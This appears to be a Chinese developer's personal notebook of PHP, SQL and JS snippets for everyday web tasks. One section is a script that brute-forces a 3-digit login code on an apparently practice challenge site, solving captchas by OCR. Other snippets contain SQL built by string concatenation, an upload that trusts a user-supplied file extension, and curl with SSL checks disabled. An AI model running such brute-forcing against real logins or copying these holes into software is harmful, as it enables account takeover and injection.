###MySQL行转列
```php
   | hostid | itemname | itemvalue |
   +--------+----------+-----------+
   |   1    |    A     |    10     |
   +--------+----------+-----------+
   |   1    |    B     |     3     |
   +--------+----------+-----------+
   |   2    |    A     |     9     |
   +--------+----------+-----------+
   |   2    |    c     |    40     |
   +--------+----------+-----------+
   
    +--------+------+-----+-----+
   | hostid |   A  |  B  |  C  |
   +--------+------+-----+-----+
   |   1    |  10  |  3  |  0  |
   +--------+------+-----+-----+
   |   2    |   9  |  0  |  40 |
   +--------+------+-----+-----+

//http://stackoverflow.com/questions/1241178/mysql-rows-to-columns
SELECT 
    hostid, 
    sum( if( itemname = 'A', itemvalue, 0 ) ) AS A,  
    sum( if( itemname = 'B', itemvalue, 0 ) ) AS B, 
    sum( if( itemname = 'C', itemvalue, 0 ) ) AS C 
FROM 
    bob 
GROUP BY 
    hostid;
```
###urlencode
```php
$url_decode    ="jellybool.com?username=jelly&bool&password=jelly";
$username="jelly&bool";
$url_decode    ="jellybool.com?username=".urlencode($username)."&password=jelly";
```
###获取一个月的第一天和最后一天
```php
function getthemonth($date)
 {
    $firstday = date('Y-m-01', strtotime($date));
    $lastday = date('Y-m-d', strtotime("$firstday +1 month -1 day"));
    return array($firstday, $lastday);
 }
$firstday= date('Y-m-d', mktime(0, 0, 0, date('m'), 1));
$lastday =date('Y-m-d', mktime(0, 0, 0,date('m')+1,1)-1);
echo cal_days_in_month(CAL_GREGORIAN,5,2016); //一个月天数,也就是最后一天 第一天 永远是1
echo date('Y-m-t');//最后一天
$week_this_monday =strtotime('last Monday'); //本周一
$tomorrow =strtotime("+1 day");//明天
echo $week_last_monday = strtotime('last Monday') - 3600 * 24 * 7; //上周一
echo $week_last_sunday =strtotime('last Monday')- 3600 * 24; //上周日
```
###获取中文字符拼音首字母
```php
echo getFirstCharter('中');//Z
function getFirstCharter($str)
    {
        if (empty($str)) {
            return '';
        }
        $fchar = ord($str{0});
        if ($fchar >= ord('A') && $fchar <= ord('z')) return strtoupper($str{0});
        $s1 = iconv('UTF-8', 'gb2312', $str);
        $s2 = iconv('gb2312', 'UTF-8', $s1);
        $s = $s2 == $str ? $s1 : $str;
        $asc = ord($s{0}) * 256 + ord($s{1}) - 65536;
        if ($asc >= -20319 && $asc <= -20284) return 'A';
        if ($asc >= -20283 && $asc <= -19776) return 'B';
        if ($asc >= -19775 && $asc <= -19219) return 'C';
        if ($asc >= -19218 && $asc <= -18711) return 'D';
        if ($asc >= -18710 && $asc <= -18527) return 'E';
        if ($asc >= -18526 && $asc <= -18240) return 'F';
        if ($asc >= -18239 && $asc <= -17923) return 'G';
        if ($asc >= -17922 && $asc <= -17418) return 'H';
        if ($asc >= -17417 && $asc <= -16475) return 'J';
        if ($asc >= -16474 && $asc <= -16213) return 'K';
        if ($asc >= -16212 && $asc <= -15641) return 'L';
        if ($asc >= -15640 && $asc <= -15166) return 'M';
        if ($asc >= -15165 && $asc <= -14923) return 'N';
        if ($asc >= -14922 && $asc <= -14915) return 'O';
        if ($asc >= -14914 && $asc <= -14631) return 'P';
        if ($asc >= -14630 && $asc <= -14150) return 'Q';
        if ($asc >= -14149 && $asc <= -14091) return 'R';
        if ($asc >= -14090 && $asc <= -13319) return 'S';
        if ($asc >= -13318 && $asc <= -12839) return 'T';
        if ($asc >= -12838 && $asc <= -12557) return 'W';
        if ($asc >= -12556 && $asc <= -11848) return 'X';
        if ($asc >= -11847 && $asc <= -11056) return 'Y';
        if ($asc >= -11055 && $asc <= -10247) return 'Z';
        return null;
    }
```
###导出csv
```php
$aData=array(
array('id'=>1,'name'=>'名称1'),
array('id'=>2,'name'=>'名称2'),
array('id'=>3,'name'=>'名称3'),
);
$aTitle = array(
    array('id','标记'),
    array('name','名称'),
);
    exportCSV($aData, $aTitle);
标记 名称
1	名称1
2	名称2
3	名称3

 function exportCSV($aData = [], $aTitle = [], $sFileName=false)
 {
    if (!is_array($aData) || !is_array($aTitle))
        return false;
    if (empty($aData) || empty($aTitle))
        return false;
    $sFileName = $sFileName ? mb_convert_encoding($sFileName, "GB2312", "UTF-8, GB2312") . ".csv": date("_YmdHis") . ".csv";
    
    header('Content-Type: text/csv; CHARSET=gb2312');
    header('Content-Disposition: attachment; filename=' . $sFileName);
    $output = fopen('php://output', 'w');
    
    for ($i=0;$i<count($aData);$i++) {
        for($j=0;$j<count($aTitle);$j++){
            $aList[$i][$j] = mb_convert_encoding($aData[$i][$aTitle[$j][0]], "GB2312", "UTF-8, GB2312");
        }
    }
    for ($i=0;$i<count($aTitle);$i++) {
        $aTitle[$i] = mb_convert_encoding($aTitle[$i][1], "GB2312", "UTF-8, GB2312");
    }
    fputcsv($output, $aTitle);
    
    foreach ($aList as $key) {
        fputcsv($output, $key);
    }
    return true;
 }
```
###php分词类库
```php
require_once 'phpanalysis/phpanalysis.class.php';
$str = "PHPAnalysis分词系统是基于字符串匹配的分词方法进行分词的，这种方法又叫做机械分词方法，它是按照一定的策略将待分析的汉字串与 一个“充分大的”机器词典中的词条进行配，若在词典中找到某个字符串，则匹配成功（识别出一个词）。按照扫描方向的不同，串匹配分词方法可以分为正向匹配 和逆向匹配；按照不同长度优先匹配的情况，可以分为最大（最长）匹配和最小（最短）匹配；按照是否与词性标注过程相结合，又可以分为单纯分词方法和分词与 标注相结合的一体化方法。常用的几种机械分词方法如下： ";
  $pa=new PhpAnalysis();
// http://www.cnblogs.com/xshang/p/3603037.html
  $pa->SetSource($str);

  $pa->resultType=2;

  $pa->differMax=true;

  $pa->StartAnalysis();

  $arr=$pa->GetFinallyIndex();
// print_r(count_chars($str,1));
```
###单例
```php
final class Product
{

    /**
     * @var self
     */
    private static $instance;

    /**
     * @var mixed
     */
    public $mix;


    /**
     * Return self instance
     *
     * @return self
     */
    public static function getInstance() {
        if (!(self::$instance instanceof self)) {
            self::$instance = new self();
        }
        return self::$instance;
    }

    private function __construct() {
    }

    private function __clone() {
    }
}

$firstProduct = Product::getInstance();
$secondProduct = Product::getInstance();

$firstProduct->mix = 'test';
$secondProduct->mix = 'example';

print_r($firstProduct->mix);
// example
print_r($secondProduct->mix);
// example
```
###filter_var
```php
$i = '100';
$result = filter_var(
    $i,

    FILTER_VALIDATE_INT,
    //设定校验的数值范围
    array(
      'options' => array('min_range' => 1, 'max_range' => 10)
    )
);
var_dump($result);//bool(false)
```
###科学计数
```php
$str =2228282829299292;
 //失败
echo (string)$str;  //2.2282828292993E+15  失败
echo '<br>';
echo ' '.$str; //2.2282828292993E+15
echo '<br>';
echo strval($str); //2.2282828292993E+15
echo '<br>';
 //成功
echo sprintf("%.0f", $str);//2228282829299292
echo '<br>';
echo number_format($str);// 三位逗号分隔 "2,228,282,829,299,292"
```
###关键字标红
```php
$string="I Love you 关键字标红";
echo preg_replace("/([\x80-\xff]+)/","<font color=red>\\1</font>",$string);//I Love you 关键字标红
```
###获取远程文件的大小

```php
function remote_filesize($url, $user = "", $pw = "")
{
	ob_start();
	$ch = curl_init($url);
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_NOBODY, 1);

	if(!empty($user) && !empty($pw))
	{
	$headers = array('Authorization: Basic ' . base64_encode("$user:$pw"));
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	}

	$ok = curl_exec($ch);
	curl_close($ch);
	$head = ob_get_contents();
	ob_end_clean();

	$regex = '/Content-Length:\s([0-9].+?)\s/';
	$count = preg_match($regex, $head, $matches);

	return isset($matches[1]) ? $matches[1] . " 字节" : "unknown";
}
echo remote_filesize("http://www.heimaolianmeng.com/luoyue/images/logo3.jpg");
```
###parse_url
```php
 $url = 'https://api.weixin.qq.com/cgi-bin/message/mass/preview?access_token=xxxxx';
parse_str(parse_url($url, PHP_URL_QUERY), $data);
echo $data['access_token'];//xxxxx
```
###base64上传文件
```php
function upload($base64){
     
    if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $base64, $result)){
      $type = $result[2];
      $new_file = "./Uploads/".time().".{$type}";
      if (file_put_contents($new_file, base64_decode(str_replace($result[1], '', $base64)))){
        echo '新文件保存成功：', $new_file;
      }
     }
 }
```
###舍去法取整
```php
function number_format_floor($number, $decimals=0, $dec_point='.', $thousands_sep=',') {
    $tmp = pow(10,$decimals);
    return number_format(floor($tmp*($number))/$tmp, $decimals, $dec_point, $thousands_sep);
 }
 echo number_format_floor(123.657,2);//123.65
```
###用户名、邮箱、手机账号中间字符串以*隐藏 
```php
function hideStar($str) { //用户名、邮箱、手机账号中间字符串以*隐藏 
    if (strpos($str, '@')) { 
        $email_array = explode("@", $str); 
        $prevfix = (strlen($email_array[0]) < 4) ? "" : substr($str, 0, 3); //邮箱前缀 
        $count = 0; 
        $str = preg_replace('/([\d\w+_-]{0,100})@/', '***@', $str, -1, $count); 
        $rs = $prevfix . $str; 
    } else { 
        $pattern = '/(1[3458]{1}[0-9])[0-9]{4}([0-9]{4})/i'; 
        if (preg_match($pattern, $str)) { 
            $rs = preg_replace($pattern, '$1****$2', $str); // substr_replace($name,'****',3,4); 
        } else { 
            $rs = substr($str, 0, 3) . "***" . substr($str, -1); 
        } 
    } 
    return $rs; 
 }
 echo hideStar('test@163.com');//tes***@163.com
```
###微信红包算法
```php
print_r(getRand([4,7,2,8,1]));//1
 function getRand($proArr) { //传入的为一维数字数组,此数组中数字即为相应概率 中奖概率问题应
        $result = '';
        //概率数组的总概率精度
        $proSum = array_sum($proArr);
        //概率数组循环
        foreach ($proArr as $key => $proCur) {
            $randNum = mt_rand(1, $proSum);
            if ($randNum <= $proCur) {
                $result = $key;
                break;
            } else {
                $proSum -= $proCur;
            }
        }
        unset ($proArr);
        return $result;
    }
```
###md5sum md5
```php
//http://superuser.com/questions/1043672/the-md5-hash-value-is-different-from-bash-and-php
echo "hello" | md5sum //b1946ac92492d2347c6235b4d2611184
echo "hello" > file && md5sum file
md5('hello')//5D41402ABC4B2A76B9719D911017C592
echo -n "hello" | md5sum //5D41402ABC4B2A76B9719D911017C592
$ echo "str_example" | hd
00000000  73 74 72 5f 65 78 61 6d  70 6c 65 0a              |str_example.|
$ echo -n "str_example" | hd
00000000  73 74 72 5f 65 78 61 6d  70 6c 65                 |str_example|
```
###数组合并
```php
function merge(){
    $one =  json_decode('{"status":true,"data":[{"a":"a1","b":"b1"},{"c":"c1","d":"d1"}]}',true);
    $two =  json_decode('{"status":true,"data":[{"e":"e1","f":"f1"},{"g":"g1","h":"h1"}]}',true);
    return json_encode(array('status'=>true,'data'=>array_map("myfunction",$one['data'],$two['data'])));
}
function myfunction($v1,$v2){ return array_merge($v1,$v2); }
echo merge();//{"status":true,"data":[{"a":"a1","b":"b1","e":"e1","f":"f1"},{"c":"c1","d":"d1","g":"g1","h":"h1"}]}
$arr = [['time' => '2016-11-28', 'uv'=>1,'sv'=>3],['time' => '2016-11-8', 'uv'=>1,'sv'=>3]];
        $result = [['time' => '2016-11-28', 'uv'=>10,'sv'=>3]];
        $result = array_merge($result,$arr);
        $res = [];
        foreach ($result as $k => $v) {
            if (isset($res[$v['time']])) {
                $res[$v['time']]['uv'] += $v['uv'];
                $res[$v['time']]['sv'] += $v['sv'];
            } else {
                $res[$v['time']] = $v;
            }
            
        }
		
print_r($res);
[
    "2016-11-28" => [
        "time" => "2016-11-28",
        "uv"   => 11,
        "sv"   => 6
    ],
    "2016-11-8"  => [
        "time" => "2016-11-8",
        "uv"   => 1,
        "sv"   => 3
    ]
]
```
###无限极分类
```php
$cn = mysql_connect('localhost', 'root', null) or die(mysql_error());
mysql_select_db('test', $cn) or die(mysql_error());
mysql_query('set names utf8');
mysql> select *from category;
+----+--------+-----+
| id | name   | pid |
+----+--------+-----+
|  1 | 电脑   |   0 |
|  2 | 手机   |   0 |
|  3 | 笔记本 |   1 |
|  4 | 台式机 |   1 |
|  5 | 智能机 |   2 |
|  6 | 功能机 |   2 |
|  7 | 超级本 |   3 |
|  8 | 游戏本 |   3 |
+----+--------+-----+
8 rows in set (0.00 sec)

echo '<pre>';

function getLists($pid = 0, &$lists = array(), $deep = 1) {
  $sql = 'SELECT * FROM category WHERE pid='.$pid;
  $res = mysql_query($sql);
  while ( ($row = mysql_fetch_assoc($res)) !== FALSE ) {
    $row['name'] = str_repeat('&nbsp;&nbsp;&nbsp;', $deep).'|---'.$row['name'];
    $lists[] = $row;
    getLists($row['id'], $lists, ++$deep); //进入子类之前深度+1
    --$deep; //从子类退出之后深度-1
  }
  return $lists;
}
//https://my.oschina.net/u/1156660/blog/341199
function displayLists($pid = 0, $selectid = 1) {
  $result = getLists($pid);
  $str = '<select>';
  foreach ( $result as $item ) {
    $selected = "";
    if ( $selectid == $item['id'] ) {
      $selected = 'selected';
    }
    $str .= '<option '.$selected.'>'.$item['name'].'</option>';
  }
  return $str .= '</select>';
}
/**
 * 从子类开始逐级向上获取其父类
 * @param number $cid
 * @param array $category
 * @return array:
 */
function getCategory($cid, &$category = array()) {
  $sql = 'SELECT * FROM category WHERE id='.$cid.' LIMIT 1';
  $result = mysql_query($sql);
  $row = mysql_fetch_assoc($result);
  if ( $row ) {
    $category[] = $row;
    getCategory($row['pid'], $category);
  }
  krsort($category); //逆序,达到从父类到子类的效果
  return $category;
}

function displayCategory($cid) {
  $result = getCategory($cid);
  print_r($result);
  $str = "";
  foreach ( $result as $item ) {
    $str .= '<a href="'.$item['id'].'">'.$item['name'].'</a>>';
  }
  return substr($str, 0, strlen($str) - 1);
}

echo displayLists(0, 3);

echo displayCategory(8);//电脑>笔记本>游戏本
$pdo = new PDO("mysql:host=localhost;dbname=test", "root", null);
function getCategories(PDO $pdo, $pid = 0)
{
    $sql = 'SELECT * FROM `category` WHERE pid=:pid';
    $stmt = $pdo->prepare($sql);
    $stmt->bindParam(':pid', $pid, PDO::PARAM_INT);
    $stmt->execute();
    $data = $stmt->fetchAll(PDO::FETCH_ASSOC);
    foreach ($data as &$row) {
        $row['children'] = getCategories($pdo, $row['id']);
    }
    return $data;
}

$a = getCategories($pdo);
print_r($a);
Array
(
    [0] => Array
        (
            [id] => 1
            [name] => 电脑
            [pid] => 0
            [children] => Array
                (
                    [0] => Array
                        (
                            [id] => 3
                            [name] => 笔记本
                            [pid] => 1
                            [children] => Array
                                (
                                    [0] => Array
                                        (
                                            [id] => 7
                                            [name] => 超级本
                                            [pid] => 3
                                            [children] => Array
                                                (
                                                )

                                        )

                                    [1] => Array
                                        (
                                            [id] => 8
                                            [name] => 游戏本
                                            [pid] => 3
                                            [children] => Array
                                                (
                                                )

                                        )

                                )

                        )

                    [1] => Array
                        (
                            [id] => 4
                            [name] => 台式机
                            [pid] => 1
                            [children] => Array
                                (
                                )

                        )

                )

        )

    [1] => Array
        (
            [id] => 2
            [name] => 手机
            [pid] => 0
            [children] => Array
                (
                    [0] => Array
                        (
                            [id] => 5
                            [name] => 智能机
                            [pid] => 2
                            [children] => Array
                                (
                                )

                        )

                    [1] => Array
                        (
                            [id] => 6
                            [name] => 功能机
                            [pid] => 2
                            [children] => Array
                                (
                                )

                        )

                )

        )

)
```
###获取子级的最高父级
```php
$arr = [
    // id => pid
    1 => 0,
    5 => 1,
    13 => 5
];

$id = 13;
while($arr[$id]) {
    $id = $arr[$id];
}
echo $id; // 1
```
###输出中文
```php
import json
print json.dumps("你需要打印的字符串或字典或元组或数组",encoding='utf-8',ensure_ascii=False)#你需要打印的字符串或字典或元组或数组
```
###curl 封装
```php
function curl($url, $params = false, $ispost = 0, $https = 0)
    {
        $httpInfo = array();
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36');
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        if ($https) {
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); // 对认证证书来源的检查
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE); // 从证书中检查SSL加密算法是否存在
        }
        if ($ispost) {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
            curl_setopt($ch, CURLOPT_URL, $url);
        } else {
            if ($params) {
                if (is_array($params)) {
                    $params = http_build_query($params);
                }
                curl_setopt($ch, CURLOPT_URL, $url . '?' . $params);
            } else {
                curl_setopt($ch, CURLOPT_URL, $url);
            }
        }

        $response = curl_exec($ch);

        if ($response === FALSE) {
            //echo "cURL Error: " . curl_error($ch);
            return false;
        }
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $httpInfo = array_merge($httpInfo, curl_getinfo($ch));
        curl_close($ch);
        return $response;
    }
```
###下载文件
```php
$ch = curl_init(); 

    $fp=fopen('./sf.jpg', 'w');

    curl_setopt($ch, CURLOPT_URL, "https://sf-sponsor.b0.upaiyun.com/38382e90b89d6b3b35e78e80a24f2ffc.png"); 
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60); 
    curl_setopt($ch, CURLOPT_FILE, $fp); 

    $output = curl_exec($ch); 
    $info = curl_getinfo($ch);

    fclose($fp);

    $size = filesize("./sf.jpg");
    if ($size != $info['size_download']) {
        echo "下载的数据不完整，请重新下载";
    } else {
        echo "下载数据完整";
    }
    curl_close($ch); 
```
###self static
```php
class Base {
    public function log() {

        // 目标类，输出：A/C
        echo static::class;
        
        
        // 基类，输出：Base
        //echo __CLASS__; 
        echo self::class;
        
    }
}

class A extends Base {
    public function log1() {
        echo self::class;
    }
}
class C extends A {
    public function log2() {
        echo self::class;
    }
}

$a = new A();$c = new C();
$a->log(); //输出 A Base
$c->log(); //输出 C Base
$c->log1(); //输出 A
$c->log2(); //输出 C
```
###使用cookie模拟登陆获取数据
```php
function get_content($url, $cookie='') { 
    $ch = curl_init(); 
    $headers = array(
    "cookie: mp_18fe57584af9659dea732cf41c1c0416_mixpanel=%7B%22; _ga=GA1.2.1212220601.1411881224",
    "DNT:1",
"Host:segmentfault.com",
"Origin:https://segmentfault.com",
"Referer:https://segmentfault.com/a/1190000006194027",
"User-Agent:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.2000 Chrome/30.0.1599.101 Safari/537.36",
"X-Requested-With:XMLHttpRequest"
  );
    curl_setopt($ch, CURLOPT_URL, $url); 
    curl_setopt($ch, CURLOPT_HEADER, 0); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1); 
    // curl_setopt($ch, CURLOPT_COOKIE, 'mp_18fe57584af9659dea732cf41c1c0416_mixpanel=%7B%22; _ga=GA1.2.1212220601.1411881224'); 
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);  
    $rs = curl_exec($ch); 
    curl_close($ch); 
    return $rs; 
}
postman 使用cookie https://www.getpostman.com/docs/interceptor_cookies
先开启interceptor 
然后header添加Cookie: name=value; name2=value2
```
###mysql 删除重复记录出错
```php
//DELETE FROM foo WHERE id NOT IN (SELECT * FROM (SELECT MAX(id) FROM foo  GROUP BY prid) as tmp)
// delete from 表名 where 字段ID in (select * from (select max(字段ID) from 表名 group by 重复的字段 having count(重复的字段) > 1) as b); 
// delete a from foo a ,  (select min(id) as ms ,prid from foo group by prid having count(*)>1) b  where a.prid=b.prid and a.id>b.ms;
select * from (select * from qdwyc_car_online order by car_online_time desc  ) as m group by car_num
 DELETE FROM price_monitor  WHERE EXISTS (SELECT 1 FROM price_monitor b WHERE b.domain = price_monitor.domain );
```
###laravel 关联
```php
class topic {

  function article()
    {
        return $this->belongsToMany('App\Models\article', 'relation_article', 'topic_id', 'article_id');
    }
}
// $topic = $this->topic->find($id);
// $article = $topic->article()->whereRaw('is_open!=1')->get();$topic->article()返回的是article表数据
```
###分组取时间最大的
```php
create table a (a_id int,name varchar(15));
create table b (b_id int ,a_id int,create_time datetime);
insert into a set a_id=1,name='1';
insert into a set a_id=2,name='2';
insert into b set b_id=1,a_id=1,create_time=now();
insert into b set b_id=2,a_id=1,create_time=now();
insert into b set b_id=3,a_id=1,create_time=now();
insert into b set b_id=4,a_id=2,create_time=now();
insert into b set b_id=5,a_id=2,create_time=now();
select a.a_id,name,b_id,create_time from a,(select * from b group by a_id order by create_time asc ) c where a.a_id=c.a_id ;
+------+------+------+---------------------+
| a_id | name | b_id | create_time         |
+------+------+------+---------------------+
|    1 | 1    |    1 | 2016-11-24 18:34:56 |
|    2 | 2    |    4 | 2016-11-24 18:35:53 |
+------+------+------+---------------------+
```
###php 验证码识别
```php
//http://www.waitalone.cn/python-php-ocr.html
function crack_key()
{
    $crack_url = 'http://1.hacklist.sinaapp.com/vcode7_f7947d56f22133dbc85dda4f28530268/login.php';
    for ($i = 100; $i <= 999; $i++) {
        $vcode = mkvcode();
        $post_data = array(
            'username' => 13388886666,
            'mobi_code' => $i,
            'user_code' => $vcode,
            'Login' => 'submit'
        );
        $response = send_pack('POST', $crack_url, $post_data);
        if (!strpos($response, 'error')) {
            system('cls');
            echo $response;
            break;
        }else{
            echo $response."\n";
        }
    }
}


function mkvcode()
{
    $vcode = '';
    $vcode_url = "http://1.hacklist.sinaapp.com/vcode7_f7947d56f22133dbc85dda4f28530268/vcode.php";
    $pic = send_pack('GET', $vcode_url);
    file_put_contents('vcode.png', $pic);
    $cmd = "\"D:\\Program Files (x86)\\Tesseract-OCR\\tesseract.exe\" vcode.png vcode";
    system($cmd);
    if (file_exists('vcode.txt')) {
        $vcode = file_get_contents('vcode.txt');
        $vcode = trim($vcode);
        $vcode = str_replace(' ', '', $vcode);
    }
    if (strlen($vcode) == 4) {
        return $vcode;
    } else {
        return mkvcode();
    }
}

//数据包发送函数
function send_pack($method, $url, $post_data = array())
{
    $cookie = 'saeut=218.108.135.246.1416190347811282;PHPSESSID=6eac12ef61de5649b9bfd8712b0f09c2';
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_HEADER, 0);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_COOKIE, $cookie);
    if ($method == 'POST') {
        curl_setopt($curl, CURLOPT_POST, 1);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $post_data);
    }
    $data = curl_exec($curl);
    curl_close($curl);
    return $data;
}
```
###格式化正确url
```php
$url = filter_input(INPUT_POST, "http://www.W3非o法ol.com.c字符n/", FILTER_SANITIZE_URL);
```
###mysql orderby limit 翻页数据重复的问题
```php
//https://segmentfault.com/a/1190000004270202 
//https://bbs.aliyun.com/read/248026.html http://mysql.taobao.org/monthly/2015/06/04/
SELECT `post_title`,`post_date` FROM post WHERE `post_status`='publish' ORDER BY view_count desc,ID asc LIMIT 5,5
CREATE TABLE `tea_course_sort` (
  `course_sort_id` int(10) NOT NULL,
  `course_sort_name` varchar(50) DEFAULT NULL,
  `course_sort_order` int(10) DEFAULT NULL,
  PRIMARY KEY (`course_sort_id`),
  KEY `idx_course_sort_name` (`course_sort_name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
INSERT INTO `tea_course_sort` VALUES (30,'a',0),(39,'b',0),(40,'c',0),(41,'d',0),(60,'e',0),(61,'f',0),(62,'g',0),(72,'h',0),(73,'i',0),(74,'j',0),(75,'k',0),(86,'l',0),(87,'m',0);
mysql> select * from tea_course_sort;
+----------------+------------------+-------------------+
| course_sort_id | course_sort_name | course_sort_order |
+----------------+------------------+-------------------+
|             30 | a                |                 0 |
|             39 | b                |                 0 |
|             40 | c                |                 0 |
|             41 | d                |                 0 |
|             60 | e                |                 0 |
|             61 | f                |                 0 |
|             62 | g                |                 0 |
|             72 | h                |                 0 |
|             73 | i                |                 0 |
|             74 | j                |                 0 |
|             75 | k                |                 0 |
|             86 | l                |                 0 |
|             87 | m                |                 0 |
+----------------+------------------+-------------------+
13 rows in set (0.00 sec)
select * from tea_course_sort order by tea_course_sort.course_sort_order desc  limit 0,10
select * from tea_course_sort order by tea_course_sort.course_sort_order desc  limit 10,10
select * from tea_course_sort order by tea_course_sort.course_sort_order desc,course_sort_id asc  limit 10,10
+----------------+------------------+-------------------+
| course_sort_id | course_sort_name | course_sort_order |
+----------------+------------------+-------------------+
|             75 | k                |                 0 |
|             86 | l                |                 0 |
|             87 | m                |                 0 |
+----------------+------------------+-------------------+
3 rows in set (0.00 sec)
```
###laravel js中拼接数组
```php
//['5万以下','5万-10万','10万-20万','20万-50万','50万-100万','100万以上']
var arr = [
        {
            name : '付费金额',
            type : 'category',
	    //不能使用data:[{{ implode(',', array_values($data)) }}] 因为key为字符串
            data : ['{!! implode("','", array_keys($data)) !!}']
        }
    ]
var obj={
  name:'data',
  type:'line',
  // data:{!! json_encode(array_values($total)) !!}
  data:[{{ implode(',', array_values($total)) }}]//[0,0,0,0,0,0,0]
}
```
###右到左每隔3位加入一个逗号
```php
//https://segmentfault.com/q/1010000007554392
1234567890 --> 1,234,567,890
1234567890.12345 --> 1,234,567,890.123,45
function h(str){
  if(/\./.test(str)){
    return str.replace(/\d(?=(\d{3})+\.)/g, "$&,").split("").reverse().join("").replace(/\d(?=(\d{3})+\.)/g, "$&,").split("").reverse().join("");
  }else{
    return str.replace(/\d(?=(\d{3})+$)/g, "$&,");
  }
}
//加强版
function hh(str){
  if(/\./.test(str)){
    return str.replace(/\d(?=(\d{3})+\.)/g, "$&,").replace(/\d{3}(?![,.]|$)/g, "$&,");
  }else{
    return str.replace(/\d(?=(\d{3})+$)/g, "$&,");
  }
}
var num = 1234567890;
console.log(num.toLocaleString());

num = 1234567890.12345;
console.log(num.toLocaleString());
```
###拼接sql
```php
$dates = [];
$startTimestamp = strtotime(date('Y-m-d', strtotime('-10 days')));
$endTimestamp = time();
for($i = $startTimestamp; $i < $endTimestamp; $i+=86400){
    $date = date('Y-m-d', $i);
    $dates[] = $date;
}

$datesStr = implode("','", $dates);
echo $sql = 'select DATE_FORMAT(created_at, \'%Y-%m-%d\') date, count(*) count from users where DATE_FORMAT(created_at, \'%Y-%m-%d\') in (\''.$datesStr.'\') group by date';//select DATE_FORMAT(created_at, '%Y-%m-%d') date, count(*) count from users where DATE_FORMAT(created_at, '%Y-%m-%d') in ('2016-12-12','2016-12-13','2016-12-14','2016-12-15','2016-12-16','2016-12-17','2016-12-18','2016-12-19','2016-12-20','2016-12-21','2016-12-22') group by date
(
```
